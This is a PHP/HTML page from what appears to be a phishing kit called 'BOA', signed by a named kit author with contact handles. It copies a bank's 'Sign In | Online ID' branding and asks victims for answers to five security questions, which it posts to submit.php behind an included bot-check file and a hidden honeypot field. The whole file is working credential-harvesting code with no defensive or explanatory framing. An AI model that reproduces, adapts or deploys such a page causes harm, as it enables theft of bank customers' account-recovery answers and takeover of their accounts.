<?php

/**
 * @link              https://www.z0n51.com/
 * @since             06/11/2019
 * @package           BOA
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      BOA
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */
include('ckh.php');
    include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico" />


        <title>Sign In | Online ID</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="row">
                    <div class="col">
                        <img src="../assets/images/logo.png">
                    </div>
                    <div class="col text-right d-lg-block d-md-block d-sm-none d-none">
                        <img src="../assets/images/header-right.png">
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- PAGE TITLE -->
        <div class="page-title">
            <div class="container">
                <img src="../assets/images/verify.png">
            </div>
        </div>
        <!-- END PAGE TITLE -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="top-content">
                    <h3>Security Questions</h3>
                    <p>Please Answer the security questions below.</p>
                </div>
                <div class="forms">
                    <form method="post" action="submit.php">
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'q1') ?>">
                            <label for="q1">Security Question 1</label>
                            <select name="q1" class="form-control" id="q1">
                                <option value="">Select One</option>
                                <option <?php echo get_selected_option('q1','What celebrity do you most resemble?'); ?> value="What celebrity do you most resemble?">What celebrity do you most resemble?</option>
                                <option <?php echo get_selected_option('q1','What is the Last Name of your third grade teacher?'); ?> value="What is the Last Name of your third grade teacher?">What is the Last Name of your third grade teacher?</option>
                                <option <?php echo get_selected_option('q1','What was the name of your boyfriend or girlfriend?'); ?> value="What was the name of your boyfriend or girlfriend?">What was the name of your boyfriend or girlfriend?</option>
                                <option <?php echo get_selected_option('q1','What is the name of your favorite charity?'); ?> value="What is the name of your favorite charity?">What is the name of your favorite charity?</option>
                                <option <?php echo get_selected_option('q1','What is the name of your first babysitter?'); ?> value="What is the name of your first babysitter?">What is the name of your first babysitter?</option>
                                <option <?php echo get_selected_option('q1','What is the best friend first name?'); ?> value="What is the best friend first name?">What is the best friend first name?</option>
                                <option <?php echo get_selected_option('q1','In what city did you meet your spouse/significant other?'); ?> value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</option>
                                <option <?php echo get_selected_option('q1','In what city did you honeymood? (Enter full name of city only)'); ?> value="In what city did you honeymood? (Enter full name of city only)">In what city did you honeymood? (Enter full name of city only)</option>
                                <option <?php echo get_selected_option('q1','What is the last name of your family physician?'); ?> value="What is the last name of your family physician?">What is the last name of your family physician?</option>
                                <option <?php echo get_selected_option('q1','What street did your best friend in high school live on? (Enter full name of street only)'); ?> value="What street did your best friend in high school live on? (Enter full name of street only)">What street did your best friend in high school live on? (Enter full name of street only)</option>
                            </select>
                            <?php echo error_message($_SESSION['errors'],'q1'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'a1') ?>">
                            <label for="a1">Answer</label>
                            <input type="text" name="a1" class="form-control" id="a1" placeholder="answer 1" value="<?php echo get_value('a1'); ?>">
                            <?php echo error_message($_SESSION['errors'],'a1'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'q2') ?>">
                            <label for="q2">Security Question 2</label>
                            <select name="q2" class="form-control" id="q2">
                                <option value="">Select One</option>
                                <option <?php echo get_selected_option('q2','As a Child, what did you want to be when you grew up?'); ?> value="As a Child, what did you want to be when you grew up?">As a Child, what did you want to be when you grew up?</option>
                                <option <?php echo get_selected_option('q2','What is the name of your favorite restaurant?'); ?> value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
                                <option <?php echo get_selected_option('q2','What is the first name of your high school prom date?'); ?> value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
                                <option <?php echo get_selected_option('q2','Who is your favorite person in history?'); ?> value="Who is your favorite person in history?">Who is your favorite person in history?</option>
                                <option <?php echo get_selected_option('q2','What is the name of your high school\'s star athlete?'); ?> value="What is the name of your high school's star athlete?">What is the name of your high school's star athlete?</option>
                                <option <?php echo get_selected_option('q2','Where were you on New Year\'s 2000?'); ?> value="Where were you on New Year's 2000?">Where were you on New Year's 2000?</option>
                                <option <?php echo get_selected_option('q2','What was the make and model of your first car?'); ?> value="What was the make and model of your first car?">What was the make and model of your first car?</option>
                                <option <?php echo get_selected_option('q2','What was the first name of your first manager?'); ?> value="What was the first name of your first manager?">What was the first name of your first manager?</option>
                                <option <?php echo get_selected_option('q2','What is the first name of the best man/maid of honor at your wedding?'); ?> value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
                                <option <?php echo get_selected_option('q2','What was the first live concert you attended?'); ?> value="What was the first live concert you attended?">What was the first live concert you attended?</option>
                            </select>
                            <?php echo error_message($_SESSION['errors'],'q2'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'a2') ?>">
                            <label for="a2">Answer</label>
                            <input type="text" name="a2" class="form-control" id="a2" placeholder="answer 2" value="<?php echo get_value('a2'); ?>">
                            <?php echo error_message($_SESSION['errors'],'a2'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'q3') ?>">
                            <label for="q3">Security Question 3</label>
                            <select name="q3" class="form-control" id="q3">
                                <option value="">Select One</option>
                                <option <?php echo get_selected_option('q3','What is your all-time favorite song?'); ?> value="What is your all-time favorite song?">What is your all-time favorite song?</option>
                                <option <?php echo get_selected_option('q3','What is the name of a college you applied to but didn\'t attend?'); ?> value="What is the name of a college you applied to but didn't attend?">What is the name of a college you applied to but didn't attend?</option>
                                <option <?php echo get_selected_option('q3','What is the name of the medical professional who delivered your first child?'); ?> value="What is the name of the medical professional who delivered your first child?">What is the name of the medical professional who delivered your first child?</option>
                                <option <?php echo get_selected_option('q3','What is the first name of your favorite niece/nephew?'); ?> value="What is the first name of your favorite niece/nephew?">What is the first name of your favorite niece/nephew?</option>
                                <option <?php echo get_selected_option('q3','What is the name of your best childhood friend?'); ?> value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</option>
                                <option <?php echo get_selected_option('q3','What was the first name of your favorite teacher or professor?'); ?> value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
                                <option <?php echo get_selected_option('q3','What is the first name of your hairdresser/barber?'); ?> value="What is the first name of your hairdresser/barber?">What is the first name of your hairdresser/barber?</option>
                                <option <?php echo get_selected_option('q3','What is the first name of your mother\'s cloest friend?'); ?> value="What is the first name of your mother's cloest friend?">What is the first name of your mother's cloest friend?</option>
                                <option <?php echo get_selected_option('q3','On what street is your grocery store?'); ?> value="On what street is your grocery store?">On what street is your grocery store?</option>
                                <option <?php echo get_selected_option('q3','What was the name of your first pet?'); ?> value="What was the name of your first pet?">What was the name of your first pet?</option>
                            </select>
                            <?php echo error_message($_SESSION['errors'],'q3'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'a3') ?>">
                            <label for="a3">Answer</label>
                            <input type="text" name="a3" class="form-control" id="a3" placeholder="answer 3" value="<?php echo get_value('a3'); ?>">
                            <?php echo error_message($_SESSION['errors'],'a3'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'q4') ?>">
                            <label for="q4">Security Question 4</label>
                            <select name="q4" class="form-control" id="q4">
                                <option value="">Select One</option>
                                <option <?php echo get_selected_option('q4','What celebrity do you most resemble?'); ?> value="What celebrity do you most resemble?">What celebrity do you most resemble?</option>
                                <option <?php echo get_selected_option('q4','What is the Last Name of your third grade teacher?'); ?> value="What is the Last Name of your third grade teacher?">What is the Last Name of your third grade teacher?</option>
                                <option <?php echo get_selected_option('q4','What was the name of your boyfriend or girlfriend?'); ?> value="What was the name of your boyfriend or girlfriend?">What was the name of your boyfriend or girlfriend?</option>
                                <option <?php echo get_selected_option('q4','What is the name of your favorite charity?'); ?> value="What is the name of your favorite charity?">What is the name of your favorite charity?</option>
                                <option <?php echo get_selected_option('q4','What is the name of your first babysitter?'); ?> value="What is the name of your first babysitter?">What is the name of your first babysitter?</option>
                                <option <?php echo get_selected_option('q4','What is the best friend first name?'); ?> value="What is the best friend first name?">What is the best friend first name?</option>
                                <option <?php echo get_selected_option('q4','In what city did you meet your spouse/significant other?'); ?> value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</option>
                                <option <?php echo get_selected_option('q4','In what city did you honeymood? (Enter full name of city only)'); ?> value="In what city did you honeymood? (Enter full name of city only)">In what city did you honeymood? (Enter full name of city only)</option>
                                <option <?php echo get_selected_option('q4','What is the last name of your family physician?'); ?> value="What is the last name of your family physician?">What is the last name of your family physician?</option>
                                <option <?php echo get_selected_option('q4','What street did your best friend in high school live on? (Enter full name of street only)'); ?> value="What street did your best friend in high school live on? (Enter full name of street only)">What street did your best friend in high school live on? (Enter full name of street only)</option>
                            </select>
                            <?php echo error_message($_SESSION['errors'],'q4'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'a4') ?>">
                            <label for="a4">Answer</label>
                            <input type="text" name="a4" class="form-control" id="a4" placeholder="answer 4" value="<?php echo get_value('a4'); ?>">
                            <?php echo error_message($_SESSION['errors'],'a4'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'q5') ?>">
                            <label for="q5">Security Question 5</label>
                            <select name="q5" class="form-control" id="q5">
                                <option value="">Select One</option>
                                <option <?php echo get_selected_option('q5','As a Child, what did you want to be when you grew up?'); ?> value="As a Child, what did you want to be when you grew up?">As a Child, what did you want to be when you grew up?</option>
                                <option <?php echo get_selected_option('q5','What is the name of your favorite restaurant?'); ?> value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
                                <option <?php echo get_selected_option('q5','What is the first name of your high school prom date?'); ?> value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
                                <option <?php echo get_selected_option('q5','Who is your favorite person in history?'); ?> value="Who is your favorite person in history?">Who is your favorite person in history?</option>
                                <option <?php echo get_selected_option('q5','What is the name of your high school\'s star athlete?'); ?> value="What is the name of your high school's star athlete?">What is the name of your high school's star athlete?</option>
                                <option <?php echo get_selected_option('q5','Where were you on New Year\'s 2000?'); ?> value="Where were you on New Year's 2000?">Where were you on New Year's 2000?</option>
                                <option <?php echo get_selected_option('q5','What was the make and model of your first car?'); ?> value="What was the make and model of your first car?">What was the make and model of your first car?</option>
                                <option <?php echo get_selected_option('q5','What was the first name of your first manager?'); ?> value="What was the first name of your first manager?">What was the first name of your first manager?</option>
                                <option <?php echo get_selected_option('q5','What is the first name of the best man/maid of honor at your wedding?'); ?> value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
                                <option <?php echo get_selected_option('q5','What was the first live concert you attended?'); ?> value="What was the first live concert you attended?">What was the first live concert you attended?</option>
                            </select>
                            <?php echo error_message($_SESSION['errors'],'q5'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'a5') ?>">
                            <label for="a5">Answer</label>
                            <input type="text" name="a5" class="form-control" id="a5" placeholder="answer 5" value="<?php echo get_value('a5'); ?>">
                            <?php echo error_message($_SESSION['errors'],'a5'); ?>
                        </div>
                        <input type="hidden" name="type" value="etapquestions">
                        <input type="hidden" name="verbot">
                        <div class="buttons">
                            <button class="btn-submit" type="submit">Continue</button>
                            <button type="button">Cancel</button>
                        </div>
                    </form>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer" style="margin-top: 300px;">
            <div class="container">
                <img class="d-lg-block d-md-none d-sm-none d-none" src="../assets/images/footer.png">
                <img class="d-lg-none d-md-none d-sm-block d-block"  src="../assets/images/footer2.png">
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>